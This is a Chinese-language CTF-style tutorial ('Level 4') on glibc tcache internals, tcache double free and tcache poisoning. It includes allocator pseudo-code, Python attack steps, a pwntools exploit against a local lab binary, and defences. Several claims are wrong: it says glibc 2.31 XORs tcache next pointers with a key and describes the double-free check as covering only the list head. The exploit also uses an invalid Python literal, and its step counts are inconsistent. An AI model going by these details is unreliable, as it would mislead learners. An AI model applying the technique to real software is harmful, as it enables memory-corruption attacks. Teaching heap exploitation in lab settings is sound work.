# Level 4: Tcache Poisoning - 理论详解

## 目录
1. [什么是 Tcache?](#什么是-tcache)
2. [Tcache 工作原理](#tcache-工作原理)
3. [Tcache vs Fastbin](#tcache-vs-fastbin)
4. [Tcache Double Free 漏洞](#tcache-double-free-漏洞)
5. [Tcache Poisoning 攻击](#tcache-poisoning-攻击)
6. [glibc 版本差异](#glibc-版本差异)

---

## 什么是 Tcache?

### Tcache 简介

**Tcache** (Thread-local caching) 是 glibc 2.26 (2017年) 引入的**每线程缓存**机制，用于加速小内存块的分配和释放。

### 设计动机

在多线程环境中，频繁访问 fastbin 需要加锁，影响性能。Tcache 为每个线程提供独立的缓存，减少锁竞争。

### 关键特性

| 特性 | 说明 |
|------|------|
| **位置** | 每个线程的 thread local storage |
| **大小范围** | 与 fastbin 类似 (通常 16~1032 字节) |
| **数量限制** | 每个 size 最多缓存 7 个 chunk |
| **Bin 数量** | 64 个 (对应不同大小) |
| **性能** | 最快 (无需加锁) |
| **引入版本** | glibc 2.26 |

---

## Tcache 工作原理

### 数据结构

```c
// tcache bin 的条目
typedef struct tcache_entry {
    struct tcache_entry *next;  // 指向下一个 chunk (单链表)
} tcache_entry;

// tcache per-thread 结构
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];  // 每个 bin 的计数
    tcache_entry *entries[TCACHE_MAX_BINS];  // 每个 bin 的链表头
} tcache_perthread_struct;

#define TCACHE_MAX_BINS 64  // 最多 64 个 bin
```

### 内存布局

```
Thread Local Storage:
┌─────────────────────────────────────┐
│  tcache_perthread_struct            │
├─────────────────────────────────────┤
│  counts[64]  = [7, 5, 0, 3, ...]   │  ← 每个 bin 的 chunk 数量
│  entries[64] = [p1, p2, NULL, ...] │  ← 每个 bin 的链表头
└─────────────────────────────────────┘

entries[2] (size 0x20):
    ↓
+-----------+-------+-----------+
| prev_size | 0x21  | next      | ← Chunk A
+-----------+-------+-----------+
                  ↓
+-----------+-------+-----------+
| prev_size | 0x21  | next      | ← Chunk B
+-----------+-------+-----------+
                  ↓
                 NULL
```

### 分配 (malloc)

```c
void* malloc(size_t size) {
    // 1. 计算对应的 tcache bin
    size_t tcache_idx = size2tcache_idx(size);

    // 2. 检查 tcache 是否有空闲 chunk
    if (tcache->counts[tcache_idx] > 0) {
        tcache_entry *e = tcache->entries[tcache_idx];

        // 从链表头部取下
        tcache->entries[tcache_idx] = e->next;
        tcache->counts[tcache_idx]--;

        return (void*)e;
    }

    // 3. tcache 为空，进入 fastbin/small/large bin
    // ...
}
```

**关键点**：
- LIFO (后进先出)
- 无需加锁
- 最快的分配路径

### 释放 (free)

```c
void free(void* mem) {
    chunk = mem2chunk(mem);
    size = chunk_size(chunk);

    // 1. 计算 tcache bin
    size_t tcache_idx = size2tcache_idx(size);

    // 2. 检查 bin 是否已满
    if (tcache->counts[tcache_idx] < TCACHE_MAX_COUNT) {  // TCACHE_MAX_COUNT = 7

        // 3. 检查 double free (基本检测)
        tcache_entry *e = (tcache_entry*)chunk;
        if (e == tcache->entries[tcache_idx]) {  // 检查是否已在链表头部
            // 可能是 double free!
        }

        // 4. 插入 tcache 链表头部
        e->next = tcache->entries[tcache_idx];
        tcache->entries[tcache_idx] = e;
        tcache->counts[tcache_idx]++;

        return;  // 不进入 fastbin!
    }

    // 5. tcache 已满，进入 fastbin/small/large bin
    // ...
}
```

**关键点**：
- 每个 bin 最多 7 个 chunk
- Double free 检测很弱 (只检查链表头部)
- 释放后**不进入 fastbin** (重要!)

---

## Tcache vs Fastbin

### 对比表

| 特性 | Tcache | Fastbin |
|------|--------|---------|
| **引入版本** | glibc 2.26 | glibc 2.0+ |
| **位置** | Thread-local | malloc_state (全局) |
| **数量限制** | 7 个/bin | 无限制 |
| **需要加锁** | ❌ 否 | ✅ 是 (main arena) |
| **速度** | 最快 | 快 |
| **Double free 检测** | 很弱 | 弱 |
| **合并** | 不合并 | 不合并 |

### 释放顺序

```
free(chunk) 的流程:

1. 检查 tcache 是否已满 (< 7 个?)
   ├─ YES → 插入 tcache，结束
   └─ NO  → 进入 fastbin

2. 检查 fastbin
   ├─ YES → 插入 fastbin
   └─ NO  → 进入 small/large/unsorted bin
```

**示例**：
```c
// 连续释放 10 个 32-byte chunks
for (int i = 0; i < 10; i++) {
    free(chunks[i]);
}

// 结果：
// - 前 7 个进入 tcache (bin 已满)
// - 后 3 个进入 fastbin
```

---

## Tcache Double Free 漏洞

### 漏洞原理

Tcache 的 double free 检测**非常弱**：

```c
// 只检查链表头部!
if (e == tcache->entries[tcache_idx]) {
    // 可能是 double free
}
```

这意味着：
- 只有连续两次 free **同一个 chunk** 才会检测
- 中间插入其他 free 即可绕过

### 攻击步骤

#### 1. 填满 Tcache

```python
# 分配 7 个 chunk 填满 tcache
for i in range(7):
    alloc(32)  # chunk[0] - chunk[6]

# 全部释放
for i in range(7):
    free(i)

# tcache[0x20] = [6, 5, 4, 3, 2, 1, 0] (7 个，已满)
```

#### 2. 准备 Double Free

```python
# 再分配 2 个 chunk
alloc(32)  # chunk[7] - 从 tcache 取出 chunk[6]
alloc(32)  # chunk[8] - 从 tcache 取出 chunk[5]

# 现在 tcache 有 5 个: [4, 3, 2, 1, 0]

# 释放 chunk[7] (从 tcache 取出的)
free(7)  # 进入 tcache

# 再次释放 chunk[0] (仍在 tcache 中)
free(0)  # ← Double Free!
```

**为什么成功**：
- chunk[0] 不在 tcache 链表头部 (chunk[4] 在头部)
- 检测：`if (chunk[0] == chunk[4])` → false
- 绕过检测！

#### 3. Tcache 状态

```
Double free 前:
tcache[0x20] → 7 → 4 → 3 → 2 → 1 → 0 → NULL
               (chunk[7])

Double free 后:
tcache[0x20] → 0 → 7 → 4 → 3 → 2 → 1 → 0 → NULL
               └─────────────────────┘
                    循环!
```

---

## Tcache Poisoning 攻击

### 攻击目标

通过控制 tcache chunk 的 `next` 指针，让 `malloc` 返回**任意地址**。

### 利用流程

#### 步骤 1: 创建 Double Free

```python
# 1. 分配并释放 7 个 chunk 填满 tcache
for i in range(7):
    alloc(32)

for i in range(7):
    free(i)

# 2. 分配 2 个 (从 tcache 取出)
alloc(32)  # chunk[7] - 实际是原来的 chunk[6]
alloc(32)  # chunk[8] - 实际是原来的 chunk[5]

# 3. Double free
free(7)  # 回到 tcache
free(0)  # Double free! (原 chunk[0])
```

#### 步骤 2: 修改 next 指针

```python
# 分配 chunk[0] (从 tcache 头部取出)
# 实际上我们拿到了 chunk[0] 的地址
alloc(32)  # chunk[9] - 就是 chunk[0]!

# 现在编辑 chunk[0]，修改它的 next 指针
# chunk[0] 的用户数据部分存放着 next 指针
target = 0xdeadbeef  # 目标地址
next_ptr = target - 0x10  # 减去 chunk 头大小

edit(9, p64(next_ptr))

# tcache[0x20] → 0 → 7 → ...
#                  ↑
#             next 已被修改!
```

#### 步骤 3: 分配到目标地址

```python
# 接下来的分配会清空 tcache 链表
alloc(32)  # chunk[10] - chunk[7]
alloc(32)  # chunk[11] - chunk[4]
alloc(32)  # chunk[12] - chunk[3]
alloc(32)  # chunk[13] - chunk[2]
alloc(32)  # chunk[14] - chunk[1]
alloc(32)  # chunk[15] - chunk[0]

# 下一个分配返回目标地址!
target_chunk = alloc(32)  # chunk[16] - 返回 target!
```

#### 步骤 4: 写入目标地址

```python
# 现在 target_chunk 指向 0xdeadbeef
# 可以写入任意数据
edit(16, p64(0xdeadbeefcafebabe))
```

---

## glibc 版本差异

### glibc 2.26 - 2.30 (无 Safe Linking)

```
Tcache next 指针: 明文
攻击难度: ⭐⭐ 简单
```

**攻击**：
```python
# 直接伪造 next 指针
fake_next = target_address - 0x10
edit(chunk, p64(fake_next))
```

### glibc 2.31 (引入 Key 保护)

```
Tcache next 指针: next ^ key
攻击难度: ⭐⭐⭐ 中等
```

**保护机制**：
```c
// tcache_put 时
e->next = tcache->entries[idx] ^ tcache_key;  // XOR 加密

// tcache_get 时
e = tcache->entries[idx] ^ tcache_key;  // XOR 解密
```

**绕过**：
- 需要泄露 tcache_key (存储在栈上或特定偏移)
- 或使用部分覆盖 (只修改低字节)

### glibc 2.32+ (Safe Linking)

```
Fastbin/tcache: 完整 Safe Linking
攻击难度: ⭐⭐⭐⭐ 困难
```

**保护机制**：
```c
// L = 地址 >> 12 (右移 12 位)
// fd = L ^ P (P 是堆地址)
```

**绕过**：
- 需要堆地址泄露
- 使用部分覆盖 (仅修改低 12 位)
- 或利用其他原语泄露地址

---

## 实战示例

### 场景

程序允许：
- 分配固定大小 (32 字节) 的 chunk
- 释放 chunk
- 编辑 chunk
- **漏洞**: free 后不置空指针

### 目标

让 `*(unsigned long long*)chunks[0] == 0xdeadbeefcafebabefull`

### Exploit

```python
from pwn import *

p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# 步骤 1: 填满 tcache
for i in range(7):
    alloc()  # chunk[0] - chunk[6]

for i in range(7):
    free(i)

# 步骤 2: 创建 double free
alloc()  # chunk[7] - 原 chunk[6]
alloc()  # chunk[8] - 原 chunk[5]

free(7)  # 回到 tcache
free(0)  # Double free!

# 步骤 3: 修改 next 指针
alloc()  # chunk[9] - 原 chunk[0]

# 注意：这里的目标是 chunks[0] 本身
# 所以不需要伪造地址，只需要编辑它
edit(9, p64(0xdeadbeefcafebabefull))

# 步骤 4: 检查胜利条件
p.sendlineafter(b'> ', b'4')

p.interactive()
```

---

## 防御措施

### 编程层面

```c
// ✓ 正确做法
free(ptr);
ptr = NULL;  // 立即置空!

// ✗ 错误做法
free(ptr);
// ptr 仍是野指针
```

### 编译保护

```bash
# 使用现代 glibc (2.31+)
# 启用 tcache key 保护

# Address Sanitizer
gcc -fsanitize=address vuln.c -o vuln
```

### 运行时检测

```bash
# MALLOC_CHECK_
export MALLOC_CHECK_=2

# 使用 ASan
export ASAN_OPTIONS=detect_double_free=1
```

---

## 相关技术

- **Fastbin Poisoning**: 类似技术，针对 fastbin
- **House of Spirit**: 伪造 chunk
- **Tcache Perthread Corruption**: 攻击 tcache_perthread_struct
- **Safe Linking Bypass**: 现代 glibc 的绕过技术

---

## 参考资料

- [How2Heap: Tcache Poisoning](https://github.com/shellphish/how2heap#glibc-tcache-poisoning)
- [glibc Malloc Source Code (tcache)](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=refs/heads/master#l2922)
- [CTF Wiki: Tcache](https://ctf-wiki.org/pwn/linux/glibc-heap/tcache/)
- [Understanding Tcache - Azeria Labs](https://azeria-labs.com/heap-exploitation-part-3-tcache/)

---

## 关键要点

1. ✅ **Tcache 是每线程缓存** - 性能最优，无锁
2. ✅ **最多 7 个 chunk** - 填满后进入 fastbin
3. ✅ **Double free 检测很弱** - 只检查链表头部
4. ✅ **Next 指针可操纵** - 实现任意地址分配
5. ✅ **版本差异大** - glibc 2.31+ 有 key 保护

**下一步**: 实践 Level 4 挑战!
